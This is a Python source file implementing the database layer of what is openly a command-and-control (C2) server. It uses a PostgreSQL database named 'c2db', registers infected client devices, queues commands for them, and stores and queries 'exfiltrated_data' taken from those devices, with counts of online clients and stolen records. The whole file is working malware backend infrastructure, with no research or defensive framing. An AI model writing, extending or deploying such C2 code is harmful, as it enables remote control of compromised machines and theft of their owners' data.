import os
import json
import logging
from typing import Optional, Dict, Any, List
import psycopg2
from psycopg2 import pool
from psycopg2.extras import RealDictCursor

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class DatabaseManager:
    def __init__(self):
        self.db_host = os.environ.get('DB_HOST', 'localhost')
        self.db_port = int(os.environ.get('DB_PORT', '5432'))
        self.db_name = os.environ.get('DB_NAME', 'c2db')
        self.db_user = os.environ.get('DB_USER', 'c2user')
        self.db_password = os.environ.get('DB_PASSWORD', '')
        self.min_conn = int(os.environ.get('DB_MIN_CONN', '1'))
        self.max_conn = int(os.environ.get('DB_MAX_CONN', '10'))
        self.connection_pool = None
        self._init_pool()

    def _init_pool(self):
        try:
            self.connection_pool = psycopg2.pool.SimpleConnectionPool(
                self.min_conn,
                self.max_conn,
                host=self.db_host,
                port=self.db_port,
                database=self.db_name,
                user=self.db_user,
                password=self.db_password
            )
            logger.info("Database connection pool created successfully")
        except Exception as e:
            logger.error(f"Failed to create connection pool: {e}")
            raise

    def _get_connection(self):
        if not self.connection_pool:
            self._init_pool()
        return self.connection_pool.getconn()

    def _return_connection(self, conn):
        if self.connection_pool:
            self.connection_pool.putconn(conn)

    def execute_query(self, query: str, params: tuple = None, fetch_one: bool = False, fetch_all: bool = False):
        conn = None
        try:
            conn = self._get_connection()
            with conn.cursor(cursor_factory=RealDictCursor) as cur:
                cur.execute(query, params)
                if fetch_one:
                    result = cur.fetchone()
                elif fetch_all:
                    result = cur.fetchall()
                else:
                    conn.commit()
                    result = {"rowcount": cur.rowcount}
                return result
        except Exception as e:
            logger.error(f"Database query error: {e}")
            if conn:
                conn.rollback()
            return None
        finally:
            if conn:
                self._return_connection(conn)

    # ---------- Client Management ----------
    def register_client(self, device_id: str, public_key: str, device_info: Dict[str, Any]) -> bool:
        query = """
            INSERT INTO clients (device_id, public_key, device_info, first_seen, last_seen)
            VALUES (%s, %s, %s, NOW(), NOW())
            ON CONFLICT (device_id) DO UPDATE SET
                last_seen = NOW(),
                public_key = EXCLUDED.public_key,
                device_info = EXCLUDED.device_info
        """
        result = self.execute_query(query, (device_id, public_key, json.dumps(device_info)))
        return result is not None

    def get_client(self, device_id: str) -> Optional[Dict]:
        query = "SELECT * FROM clients WHERE device_id = %s"
        return self.execute_query(query, (device_id,), fetch_one=True)

    def update_client_status(self, device_id: str, status: str):
        query = "UPDATE clients SET status = %s, last_seen = NOW() WHERE device_id = %s"
        self.execute_query(query, (status, device_id))

    # ---------- Command Queue ----------
    def push_command(self, device_id: str, command_type: str, payload: Dict[str, Any], priority: int = 0) -> Optional[int]:
        query = """
            INSERT INTO command_queue (device_id, command_type, payload, priority, status, created_at)
            VALUES (%s, %s, %s, %s, 'pending', NOW())
            RETURNING id
        """
        result = self.execute_query(query, (device_id, command_type, json.dumps(payload), priority), fetch_one=True)
        return result['id'] if result else None

    def get_pending_commands(self, device_id: str, limit: int = 10) -> List[Dict]:
        query = """
            SELECT id, command_type, payload, created_at
            FROM command_queue
            WHERE device_id = %s AND status = 'pending'
            ORDER BY priority DESC, created_at ASC
            LIMIT %s
        """
        return self.execute_query(query, (device_id, limit), fetch_all=True) or []

    def mark_command_sent(self, command_id: int):
        query = "UPDATE command_queue SET status = 'sent', sent_at = NOW() WHERE id = %s"
        self.execute_query(query, (command_id,))

    def mark_command_failed(self, command_id: int, error: str):
        query = "UPDATE command_queue SET status = 'failed', error = %s WHERE id = %s"
        self.execute_query(query, (error, command_id))

    # ---------- Exfiltrated Data ----------
    def store_exfiltrated_data(self, device_id: str, data_type: str, data: Dict[str, Any]) -> bool:
        query = """
            INSERT INTO exfiltrated_data (device_id, data_type, data, received_at)
            VALUES (%s, %s, %s, NOW())
        """
        result = self.execute_query(query, (device_id, data_type, json.dumps(data)))
        return result is not None

    def get_exfiltrated_data(self, device_id: str = None, data_type: str = None, limit: int = 100) -> List[Dict]:
        query = "SELECT * FROM exfiltrated_data WHERE 1=1"
        params = []
        if device_id:
            query += " AND device_id = %s"
            params.append(device_id)
        if data_type:
            query += " AND data_type = %s"
            params.append(data_type)
        query += " ORDER BY received_at DESC LIMIT %s"
        params.append(limit)
        return self.execute_query(query, tuple(params), fetch_all=True) or []

    # ---------- Error Logs ----------
    def log_error(self, device_id: str, error_code: str, error_message: str, module: str = None):
        query = """
            INSERT INTO error_logs (device_id, error_code, error_message, module, logged_at)
            VALUES (%s, %s, %s, %s, NOW())
        """
        self.execute_query(query, (device_id, error_code, error_message, module))

    # ---------- Statistics ----------
    def get_statistics(self) -> Dict[str, Any]:
        stats = {}
        try:
            stats['total_clients'] = self.execute_query("SELECT COUNT(*) as count FROM clients", fetch_one=True)['count']
            stats['online_clients'] = self.execute_query("SELECT COUNT(*) as count FROM clients WHERE status = 'online'", fetch_one=True)['count']
            stats['pending_commands'] = self.execute_query("SELECT COUNT(*) as count FROM command_queue WHERE status = 'pending'", fetch_one=True)['count']
            stats['total_exfiltrated'] = self.execute_query("SELECT COUNT(*) as count FROM exfiltrated_data", fetch_one=True)['count']
        except Exception as e:
            logger.error(f"Failed to get statistics: {e}")
        return stats

db_manager = DatabaseManager()